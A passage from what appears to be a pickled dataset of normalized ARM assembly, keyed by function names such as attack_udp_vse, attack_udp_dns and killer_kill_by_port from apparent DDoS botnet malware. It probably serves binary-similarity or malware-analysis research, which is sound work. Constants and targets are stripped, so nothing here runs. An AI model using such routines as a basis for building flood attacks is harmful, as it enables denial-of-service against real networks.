B~R7,[R1,0]\nSTRB~R10,[R1,0]\nSTRB~R9,[R1,0]\nSTR~R2,[SP,0]\nSTRB~LR,[R1,0]\nSTRB~R6,[R1,0]\nLDR~R4,[SP,0]\nLDR~R2,[SP,0]\nCMP~R4,R2\nLDR~R0,<STR>\nMOV~R1,0\nBLT~FOO\nMOV~R3,0\nB~FOO\nLDR~R2,[SP,0]\nMOV~R7,0\nMLA~R2,R0,R7,R2\nLDR~R6,[SP,0]\nLDRB~R3,[R2,0]\nLDR~R5,[R6,R0,LSL0]\nCMP~R3,0\nADD~R6,R5,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R1,[SP,0]\nAND~R2,R4,0\nMLA~R1,R3,R7,R1\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nORR~R3,R3,R4,LSLR7\nORR~R2,R2,R4,LSRR7\nLDRB~R1,[R1,0]\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSLR7\nORR~R3,R3,R2,LSRR7\nORR~R3,R3,R1\nSTR~R3,[R5,0]\nLDR~R0,[SP,0]\nCMN~R0,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R4,<STR>\nLDR~R1,[SP,0]\nCMP~R1,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R3,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R4\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R6,0]\nSTRB~R0,[R6,0]\nLDR~R0,[SP,0]\nCMP~R0,0\nADDNE~R0,R5,0\nMOVNE~R1,R8\nBLNE~FOO\nMOV~R4,0\nMOV~R1,0\nSTRB~R4,[R5,0]\nSTRB~R4,[R5,0]\nMOV~R0,R5\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nSTRB~R4,[R6,0]\nSTRB~R4,[R6,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R1,R6\nORR~R2,R3,R2,LSL0\nMOV~R0,R5\nADD~R3,R8,0\nBL~FOO\nLDR~R3,[SP,0]\nLDR~R12,[SP,0]\nMLA~R12,R3,R7,R12\nMOV~R3,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R3,[R6,0]\nLDR~R3,[R5,0]\nMOV~R3,R3,LSR0\nMOV~R2,R3,ASR0\nSTRB~R2,[R12,0]\nSTRB~R3,[R12,0]\nMOV~R1,R5\nMOV~R3,0\nSTR~R12,[SP]\nMOV~R0,R11\nMOV~R12,0\nADD~R2,R8,0\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nCMP~R0,R1\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p224
L1204L
tp225
a(S'attack_udp_vse'
p226
S'"STMFD~SP!,{R4-R11,LR}\nAND~R0,R0,0\nSUB~SP,SP,0\nMOV~R11,R1\nMOV~R1,0\nMOV~R5,R3\nAND~R4,R2,0\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R2,0\nMOV~R1,R5\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R3,R0,LSL0\nMOV~R3,R3,LSR0\nMOV~R0,0\nSTR~R3,[SP,0]\nBL~FOO\nADD~R1,SP,0\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R10,R0\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nCMN~R0,0\nMOV~R9,R0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nBNE~FOO\nMOV~R0,R9\nBL~FOO\nB~FOO\nBL~FOO\nLDR~R1,[SP,0]\nLDR~R3,[SP,0]\nSTR~R0,[R1,R4,LSL0]\nLDR~R4,[R1,R3,LSL0]\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nLDR~R2,[SP,0]\nSTRB~R2,[R4,0]\nADD~R3,SP,0\nLDMIA~R3,{R3,R12}\nMOV~R0,R3,LSR0\nAND~R2,R3,0\nMOV~R1,R12,LSR0\nAND~R3,R12,0\nORR~R6,R1,R3,LSL0\nLDR~R3,[SP,0]\nADD~R3,R3,0\nMOV~R3,R3,LSL0\nORR~R5,R0,R2,LSL0\nMOV~R2,R3,LSR0\nAND~R2,R2,0\nSTR~R2,[SP,0]\nLDR~R2,[SP,0]\nAND~R12,R2,0\nSTR~R12,[SP,0]\nLDR~R12,[SP,0]\nMOV~LR,R2,LSR0\nORR~R2,R12,R3,LSR0\nLDR~R3,[SP,0]\nMOV~R12,R2,ASR0\nORR~LR,LR,R3,LSL0\nLDR~R3,[SP,0]\nSTR~R12,[SP,0]\nCMP~R3,0\nLDR~R3,[SP,0]\nMOV~R12,LR,ASR0\nSTRB~R3,[R4,0]\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nSTRB~R12,[R4,0]\nMOVNE~R3,0\nLDR~R12,[SP,0]\nSTRNEB~R3,[R4,0]\nMOV~R3,0\nSTRB~R12,[R4,0]\nSTRB~R3,[R4,0]\nSTRB~R2,[R4,0]\nLDR~R2,[SP,0]\nADD~R3,R3,0\nMLA~R2,R3,R2,R11\nLDR~R3,<STR>\nLDR~R3,[R3]\nSTR~R3,[R4,0]\nLDR~R3,[R2,0]\nSTRB~LR,[R4,0]\nSTR~R3,[R4,0]\nLDR~R3,[SP,0]\nADD~R3,R3,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nAND~R2,R2,0\nORR~R2,R2,R3,LSR0\nMOV~R3,0\nADD~R12,R4,0\nSTR~R3,[R4,0]\nMOV~R8,R5,ASR0\nMOV~R3,R2,ASR0\nMOV~R7,R6,ASR0\nSTRB~R3,[R12,0]\nSTRB~R5,[R4,0]\nSTRB~R2,[R12,0]\nADD~R0,R4,0\nMOV~R1,R10\nSTRB~R7,[R12,0]\nSTRB~R8,[R12,0]\nSTRB~R6,[R12,0]\nLDR~R2,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R4,[SP,0]\nLDR~R2,[SP,0]\nCMP~R4,R2\nMOV~R1,0\nMOV~R0,0\nBLT~FOO\nMOV~R3,0\nB~FOO\nMLA~R2,R0,R10,R11\nLDR~R12,[SP,0]\nLDRB~R3,[R2,0]\nLDR~R5,[R12,R0,LSL0]\nCMP~R3,0\nADD~R6,R5,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nLDR~R3,[SP,0]\nMLA~R1,R3,R10,R11\nAND~R2,R4,0\nAND~R3,R4,0\nMOV~R2,R2,LSR0\nMOV~R3,R3,LSL0\nLDRB~R1,[R1,0]\nORR~R3,R3,R4,LSL0\nORR~R2,R2,R4,LSR0\nORR~R2,R2,R3\nADD~R2,R2,R0,LSRR1\nAND~R3,R2,0\nAND~R1,R2,0\nMOV~R3,R3,LSR0\nMOV~R1,R1,LSL0\nORR~R1,R1,R2,LSL0\nORR~R3,R3,R2,LSR0\nORR~R3,R3,R1\nSTR~R3,[R5,0]\nLDR~R1,[SP,0]\nCMP~R1,R7\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nCMP~R2,R7\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R3,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R7\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R6,0]\nSTRB~R0,[R6,0]\nMOV~R1,0\nSTRB~R8,[R5,0]\nSTRB~R8,[R5,0]\nMOV~R0,R5\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nSTRB~R8,[R6,0]\nSTRB~R8,[R6,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nORR~R2,R3,R2,LSL0\nLDR~R3,[SP,0]\nMOV~R1,R6\nADD~R3,R3,0\nMOV~R0,R5\nBL~FOO\nLDR~R3,[SP,0]\nMLA~R12,R3,R10,R11\nMOV~R3,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R3,[R6,0]\nLDR~R3,[R5,0]\nMOV~R3,R3,LSR0\nMOV~R2,R3,ASR0\nSTRB~R2,[R12,0]\nLDR~R2,[SP,0]\nSTRB~R3,[R12,0]\nMOV~R1,R5\nMOV~R3,0\nSTR~R12,[SP]\nADD~R2,R2,0\nMOV~R12,0\nMOV~R0,R9\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nLDR~R12,[SP,0]\nCMP~R0,R12\nMOV~R8,0\nMOV~R10,0\nLDR~R7,<STR>\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p227
L1120L
tp228
a(S'attack_udp_dns'
p229
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nAND~R0,R0,0\nSTR~R1,[SP,0]\nMOV~R1,0\nAND~R4,R2,0\nMOV~R5,R3\nSTR~R0,[SP,0]\nBL~FOO\nMOV~R1,R5\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R0,R4\nMOV~R3,0\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0,LSL0\nMOV~R12,R12,LSR0\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nMOV~R12,R0\nAND~R12,R12,0\nMOV~R2,0\nMOV~R3,0\nMOV~R1,R5\nMOV~R0,R4\nSTR~R12,[SP,0]\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nCMP~R4,0\nBLT~FOO\nADD~R5,SP,0\nSUB~R5,R5,0\nMOV~R1,R5\nMOV~R2,0\nMOV~R0,R4\nBL~FOO\nMOV~R7,R0\nMOV~R0,R4\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nMOV~R1,R7\nMOV~R2,R0\nMOV~R0,R5\nBL~FOO\nMOV~R6,R0\nMOV~R0,0\nBL~FOO\nCMN~R6,0\nADDNE~R0,R5,R6\nMOVNE~R12,0\nMOVNE~R5,R6\nBNE~FOO\nB~FOO\nLDRB~R3,[R0]\nCMP~R12,0\nADD~R0,R0,0\nSUB~R2,R3,0\nBNE~FOO\nCMP~R3,0\nCMPNE~R3,0\nBEQ~FOO\nADD~R12,R12,0\nCMP~R3,0\nCMPNE~R2,0\nBHI~FOO\nCMP~R5,R1\nBNE~FOO\nADD~R1,SP,0\nADD~R4,SP,0\nRSB~R5,R6,R5\nADD~R4,R4,0\nSUB~R1,R1,0\nADD~R1,R1,R6\nMOV~R0,R4\nMOV~R2,R5\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nADD~R2,R0,R5\nMOV~R3,0\nMOV~R0,R4\nSTRB~R3,[R2,-0]\nBL~FOO\nSTR~R0,[SP,0]\nB~FOO\nADD~R5,R5,0\nCMP~R5,R7\nSUB~R1,R7,0\nBLT~FOO\nBL~FOO\nAND~R0,R0,0\nCMP~R0,0\nLDRLS~PC,[PC,R0,LSL0]\nB~FOO\nLDR~R1,<STR>\nSTR~R1,[SP,0]\nB~FOO\nLDR~R2,<STR>\nSTR~R2,[SP,0]\nB~FOO\nLDR~R3,<STR>\nSTR~R3,[SP,0]\nB~FOO\nLDR~R4,<STR>\nSTR~R4,[SP,0]\nLDR~R6,[SP,0]\nCMP~R6,0\nBEQ~FOO\nMOV~R0,R6\nBL~FOO\nMOV~R1,0\nSTR~R0,[SP,0]\nMOV~R2,0\nMOV~R0,0\nBL~FOO\nCMN~R0,0\nSTR~R0,[SP,0]\nBEQ~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nMOV~R12,0\nMOV~R1,0\nADD~R2,R2,0\nSTR~R12,[SP]\nBL~FOO\nCMN~R0,0\nMOVNE~R3,0\nSTRNE~R3,[SP,0]\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nLDR~LR,[SP,0]\nLDR~R3,[SP,0]\nSTR~R0,[LR,R4,LSL0]\nLDR~R10,[LR,R3,LSL0]\nLDRB~R3,[R10]\nBIC~R3,R3,0\nORR~R3,R3,0\nLDR~R0,[SP,0]\nLDR~R1,[SP,0]\nSTRB~R3,[R10]\nLDRB~R3,[R10]\nBIC~R3,R3,0\nORR~R3,R3,0\nADD~LR,R0,R1\nLDR~R2,[SP,0]\nLDR~R4,[SP,0]\nMOV~LR,LR,LSL0\nSTRB~R3,[R10]\nLDR~R6,[SP,0]\nADD~R12,LR,0\nCMP~R4,0\nMOV~R1,R12,LSR0\nMOV~R0,R2,LSR0\nAND~R2,R2,0\nSTRB~R6,[R10,0]\nMOVNE~R3,0\nORR~R0,R0,R2,LSL0\nAND~R1,R1,0\nSTRNEB~R3,[R10,0]\nSTRB~R0,[R10,0]\nORR~R1,R1,R12,LSR0\nMOVNE~R3,0\nMOV~R12,R0,ASR0\nLDR~R0,[SP,0]\nSTRNEB~R3,[R10,0]\nMOV~R2,R1,ASR0\nMOV~R3,0\nSTRB~R0,[R10,0]\nSTRB~R3,[R10,0]\nSTRB~R2,[R10,0]\nMOV~R2,LR,LSR0\nADD~R3,SP,0\nLDMIA~R3,{R3,R6}\nADD~R2,R2,0\nMOV~R2,R2,LSL0\nSTRB~R12,[R10,0]\nSTRB~R1,[R10,0]\nAND~R5,R3,0\nMOV~R1,R2,LSR0\nMOV~R4,R3,LSR0\nMOV~R12,R6,LSR0\nAND~R3,R6,0\nORR~R12,R12,R3,LSL0\nAND~R1,R1,0\nLDR~R3,<STR>\nORR~R1,R1,R2,LSR0\nLDR~R2,[SP,0]\nLDR~R6,[R3]\nLDR~R0,[SP,0]\nADD~R3,R10,0\nADD~R3,R3,R2\nADD~R9,R10,0\nORR~R4,R4,R5,LSL0\nMOV~R2,R12,ASR0\nMOV~LR,R0,LSR0\nSTR~R3,[SP,0]\nAND~R0,R0,0\nMOV~R3,R1,ASR0\nORR~LR,LR,R0,LSL0\nMOV~R7,R4,ASR0\nSTRB~R3,[R9,0]\nSTRB~R2,[R9,0]\nSTR~R6,[R10,0]\nSTRB~R12,[R9,0]\nSTRB~R1,[R9,0]\nSTRB~R4,[R10,0]\nLDR~R4,[SP,0]\nADD~R11,R10,0\nMOV~R5,0\nMOV~R0,0\nMOV~R8,LR,ASR0\nSTRB~R7,[R9,0]\nLDR~R3,[SP,0]\nSTRB~R0,[R11,0]\nSTRB~LR,[R10,0]\nSTRB~R0,[R11,0]\nSTRB~R8,[R11,0]\nSTRB~R5,[R11,0]\nSTRB~R5,[R11,0]\nSTRB~R4,[R10,0]\nLDR~R6,[SP,0]\nADD~R1,SP,0\nLDMIA~R1,{R1,LR}\nADD~R2,LR,0\nSTR~R3,[R10,0]\nADD~R0,R6,R0\nBL~FOO\nLDR~R2,[SP,0]\nMOV~R1,R5\nB~FOO\nLDR~R4,[SP,0]\nLDRB~R3,[R1,R4]\nCMP~R3,0\nSTREQB~R5,[R2]\nANDNE~R5,R12,0\nADDEQ~R2,R0,0\nMOVEQ~R5,0\nADD~R1,R1,0\nLDR~LR,[SP,0]\nLDR~R6,[SP,0]\nCMP~R1,LR\nADD~R12,R5,0\nADD~R0,R6,R1\nBLT~FOO\nSTRB~R5,[R2]\nLDR~R2,[SP,0]\nADD~R12,R6,LR\nADD~R3,R12,0\nMOV~R1,0\nMOV~R0,0\nADD~R2,R2,0\nSTRB~R1,[R12,0]\nSTRB~R0,[R3,0]\nSTRB~R1,[R3,0]\nSTR~R2,[SP,0]\nSTRB~R0,[R3,0]\nLDR~R4,[SP,0]\nLDR~R0,[SP,0]\nCMP~R4,R0\nBLT~FOO\nMOV~R3,0\nB~FOO\nLDR~R1,[SP,0]\nLDR~R2,[SP,0]\nLDR~R4,[R1,R0,LSL0]\nCMP~R2,R6\nADD~R5,R4,0\nADD~R8,R4,0\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R4,0]\nSTRB~R0,[R4,0]\nLDR~R3,[SP,0]\nCMP~R3,R6\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R4,0]\nSTRB~R3,[R5,0]\nLDR~LR,[SP,0]\nCMP~LR,R6\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R5,0]\nSTRB~R0,[R5,0]\nLDR~R0,[SP,0]\nCMP~R0,R6\nBNE~FOO\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R0,[R4,0]\nSTRB~R3,[R8,0]\nADD~R0,R4,0\nLDR~R1,[SP,0]\nBL~FOO\nMOV~R1,0\nSTRB~R7,[R4,0]\nSTRB~R7,[R4,0]\nMOV~R0,R4\nBL~FOO\nMOV~R3,R0,ASR0\nSTRB~R3,[R4,0]\nSTRB~R0,[R4,0]\nSTRB~R7,[R5,0]\nSTRB~R7,[R5,0]\nLDRB~R3,[R4,0]\nLDRB~R2,[R4,0]\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nMOV~R0,R4\nADD~R3,R10,0\nBL~FOO\nLDR~R2,[SP,0]\nLDR~R12,[SP,0]\nMOV~R3,0\nMLA~R12,R2,R3,R12\nLDR~R1,[SP,0]\nMOV~R3,R0,ASR0\nSTRB~R0,[R5,0]\nSTRB~R3,[R5,0]\nSTR~R1,[R12,0]\nLDR~R3,[R4,0]\nMOV~R3,R3,LSR0\nMOV~R2,R3,ASR0\nSTRB~R2,[R12,0]\nSTRB~R3,[R12,0]\nMOV~R1,R4\nMOV~R3,0\nSTR~R12,[SP]\nADD~R2,R10,0\nMOV~R12,0\nLDR~R0,[SP,0]\nSTR~R12,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nADD~R3,R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nLDR~R4,[SP,0]\nLDR~R2,[SP,0]\nLDR~R3,[SP,0]\nCMP~R0,R4\nMOV~R7,0\nADD~R10,R2,R3\nLDR~R6,<STR>\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p230
L1720L
tp231
a(S'checksum_generic'
p232
S'"MOV~R12,0\nB~FOO\nLDRB~R3,[R0]\nLDRB~R2,[R0,0]\nORR~R3,R3,R2,LSL0\nADD~R12,R12,R3\nADD~R0,R0,0\nCMP~R1,0\nSUB~R1,R1,0\nBHI~FOO\nLDREQB~R3,[R0]\nADDEQ~R12,R12,R3\nMOV~R0,R12,LSL0\nMOV~R0,R0,LSR0\nADD~R0,R0,R12,LSR0\nADD~R0,R0,R0,LSR0\nMVN~R0,R0\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nRET"'
p233
L80L
tp234
a(S'checksum_tcpudp'
p235
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R2,R2,LSL0\nADD~R4,R0,0\nLDMIA~R4,{R4,R5}\nMOV~R12,R3\nMOV~R6,R2,LSR0\nMOV~LR,0\nB~FOO\nLDRB~R3,[R1]\nLDRB~R2,[R1,0]\nORR~R3,R3,R2,LSL0\nADD~LR,LR,R3\nADD~R1,R1,0\nCMP~R12,0\nSUB~R12,R12,0\nBGT~FOO\nLDREQB~R3,[R1]\nADDEQ~LR,LR,R3\nMOV~R3,R4,LSL0\nMOV~R3,R3,LSR0\nMOV~R2,R5,LSL0\nMOV~R2,R2,LSR0\nADD~R3,R3,R4,LSR0\nLDRB~R1,[R0,0]\nADD~R3,R3,R2\nADD~R2,LR,R5,LSR0\nADD~R2,R2,R1,LSL0\nADD~R3,R3,R6\nB~FOO\nMOV~R3,R0,LSL0\nMOV~R3,R3,LSR0\nADD~R0,R3,R2\nMOVS~R2,R0,LSR0\nBNE~FOO\nMVN~R0,R0\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nLDMFD~SP!,{R4-R6,PC}"'
p236
L152L
tp237
a(S'mem_exists'
p238
S'"CMP~R3,R1\nSTMFD~SP!,{R4,LR}\nMOVLE~R12,0\nMOV~LR,R3\nMOV~R4,R2\nBLE~FOO\nB~FOO\nLDRB~R2,[R4,R12]\nLDRB~R3,[R0]\nCMP~R3,R2\nADD~R12,R12,0\nMOVNE~R12,0\nBNE~FOO\nCMP~R12,LR\nBNE~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,PC}\nADD~R0,R0,0\nSUBS~R1,R1,0\nBCS~FOO\nMOV~R0,0\nLDMFD~SP!,{R4,PC}"'
p239
L88L
tp240
a(S'killer_kill'
p241
S'"LDR~R3,<STR>\nLDR~R0,[R3]\nMOV~R1,0\nB~FOO"'
p242
L16L
tp243
a(S'killer_kill_by_port'
p244
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSUB~SP,SP,0\nMOV~R4,R0,LSL0\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nMOV~R2,0\nSUB~R0,R0,0\nBL~FOO\nADD~R0,SP,0\nMOV~R1,0\nMOV~R2,0\nSUB~R0,R0,0\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nMOV~R1,0\nLDR~R2,<STR>\nSUB~R0,R0,0\nMOV~R5,R4,LSR0\nBL~FOO\nAND~R5,R5,0\nADD~R0,SP,0\nADD~R6,SP,0\nMOV~R1,0\nMOV~R2,0\nADD~R6,R6,0\nADD~R0,R0,0\nMOV~R5,R5,LSL0\nBL~FOO\nMOV~R1,0\nMOV~R2,R6\nORR~R0,R5,R4,LSR0\nBL~FOO\nMOV~R0,R6\nBL~FOO\nCMP~R0,0\nBNE~FOO\nADD~R0,SP,0\nLDRB~R3,[R0,0]\nLDRB~R2,[R0,0]\nMOV~R1,0\nSTRB~R3,[R0,0]\nMOV~R3,0\nSTRB~R2,[R0,0]\nSTRB~R3,[R0,0]\nSTRB~R1,[R0,0]\nSTRB~R1,[R0,0]\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nLDR~R0,<STR>\nMOV~R1,0\nBL~FOO\nCMN~R0,0\nMOV~R8,R0\nMOVEQ~R0,0\nBEQ~FOO\nB~FOO\nADD~R2,R2,0\nADD~R1,SP,0\nADD~R1,R1,0\nSUB~R1,R1,0\nLDRB~R3,[R2,R1]\nCMP~R3,0\nCMPNE~R3,0\nBNE~FOO\nCMP~R3,0\nADDNE~R0,R2,0\nADDNE~R2,R1,R0\nBNE~FOO\nB~FOO\nADD~R2,R2,0\nLDRB~R3,[R2]\nCMP~R3,0\nCMPNE~R3,0\nMOVEQ~R7,0\nMOVNE~R7,0\nBNE~FOO\nADD~R6,SP,0\nADD~R6,R6,0\nSUB~R6,R6,0\nADD~R1,SP,0\nRSB~R5,R6,R2\nADD~R1,R1,0\nADD~R3,R1,R5\nADD~R4,R6,R0\nSTRB~R7,[R3,-0]\nMOV~R0,R4\nBL~FOO\nADD~R2,SP,0\nMOV~R1,R0\nADD~R2,R2,0\nMOV~R0,R4\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R2,R7\nADD~R4,R6,R5\nADD~R12,R5,0\nMOV~R0,R7\nMOV~LR,R7\nB~FOO\nCMP~R3,0\nCMPNE~R3,0\nMOVNE~R1,0\nMOVEQ~R1,0\nMOVEQ~R2,0\nBEQ~FOO\nCMP~R2,0\nBNE~FOO\nADD~R0,R0,0\nCMP~R0,0\nBNE~FOO\nLDRB~R3,[R4,0]\nCMP~R3,0\nMOVNE~R2,R1\nBNE~FOO\nB~FOO\nMOV~R2,0\nCMP~R0,0\nADD~R4,R4,0\nBGT~FOO\nLDRB~R3,[R4,0]\nCMP~R3,0\nADD~R12,R12,0\nBNE~FOO\nCMP~LR,0\nMOV~R0,R12\nBEQ~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nSUB~R3,R3,0\nADD~R2,R3,R12\nB~FOO\nADD~R12,R12,0\nLDRB~R3,[R2]\nCMP~R3,0\nCMPNE~R3,0\nMOVEQ~LR,0\nMOVNE~LR,0\nBNE~FOO\nADD~R3,SP,0\nADD~R3,R3,0\nADD~R2,SP,0\nSUB~R3,R3,0\nADD~R2,R2,0\nADD~R4,R3,R0\nADD~R3,R2,R12\nMOV~R0,R4\nSTRB~LR,[R3,-0]\nBL~FOO\nCMP~R0,0\nBGT~FOO\nADD~R0,SP,0\nMOV~R1,R4\nADD~R0,R0,0\nBL~FOO\nB~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nSUB~R0,R0,0\nMOV~R1,0\nMOV~R2,R8\nBL~FOO\nCMP~R0,0\nMOVNE~R2,0\nBNE~FOO\nMOV~R0,R8\nBL~FOO\nADD~R0,SP,0\nADD~R0,R0,0\nBL~FOO\nSUBS~R4,R0,0\nBNE~FOO\nADD~R0,R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,0\nBL~FOO\nMOV~R0,R4\nB~FOO\nMOV~R1,0\nMOV~R0,0\nBL~FOO\nBL~FOO\nSUBS~R10,R0,0\nMOVEQ~R8,R10\nMOVNE~R8,0\nBNE~FOO\nB~FOO\nLDRB~R3,[R0,0]\nSUB~R3,R3,0\nCMP~R3,0\nADD~R7,R0,0\nBHI~FOO\nMOV~R1,R8\nMOV~R0,0\nBL~FOO\nADD~R5,SP,0\nADD~R5,R5,0\nSUB~R5,R5,0\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R7\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R8\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nADD~R1,SP,0\nMOV~R0,R5\nSUB~R1,R1,0\nMOV~R2,0\nBL~FOO\nCMN~R0,0\nBEQ~FOO\nMOV~R1,R8\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nMOV~R0,R5\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R7\nADD~R0,R5,R0\nBL~FOO\nMOV~R0,R5\nBL~FOO\nMOV~R1,R8\nMOV~R4,R0\nMOV~R0,0\nBL~FOO\nMOV~R1,R0\nADD~R0,R5,R4\nBL~FOO\nMOV~R0,R5\nBL~FOO\nSUBS~R11,R0,0\nBNE~FOO\nB~FOO\nBL~FOO\nMOV~R1,R8\nMOV~R0,0\n